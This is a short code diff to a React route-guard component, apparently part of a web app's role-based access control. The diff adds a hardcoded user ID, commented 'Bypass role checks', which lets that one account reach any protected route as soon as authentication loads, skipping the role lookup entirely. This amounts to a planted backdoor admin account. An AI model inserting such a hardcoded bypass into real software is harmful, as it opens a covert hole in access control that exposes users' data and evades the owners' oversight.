@@ -38,6 +38,9 @@ const ProtectedRoute = ({
   const userId = user?.id;
   const allowedRolesKey = allowedRoles.join('|');
 
+  // Hardcoded admin access for specific user (Bypass role checks)
+  const isSuperAdmin = userId === '7c241c37-32c2-4d60-a245-d704333874cb';
+
   // If role lookup fails or times out, verify the currently requested area directly.
   useEffect(() => {
     let isActive = true;
@@ -140,7 +143,20 @@ const ProtectedRoute = ({
   }, [user, authLoading, isIOS, authRedirectGrace]);
 
   // Show loading state while checking auth and role
-  if (authLoading || roleLoading || fallbackLoading || (user && !role && !fallbackRole && !roleGraceExpired)) {
+  if (authLoading) {
+    return (
+      <div className="min-h-screen flex items-center justify-center">
+        <Loader2 className="h-8 w-8 animate-spin text-primary" />
+      </div>
+    );
+  }
+
+  // Super admin bypass - return children immediately once user is loaded
+  if (isSuperAdmin) {
+    return <>{children}</>;
+  }
+
+  if (roleLoading || fallbackLoading || (user && !role && !fallbackRole && !roleGraceExpired)) {
     return (
       <div className="min-h-screen flex items-center justify-center">
         <Loader2 className="h-8 w-8 animate-spin text-primary" />
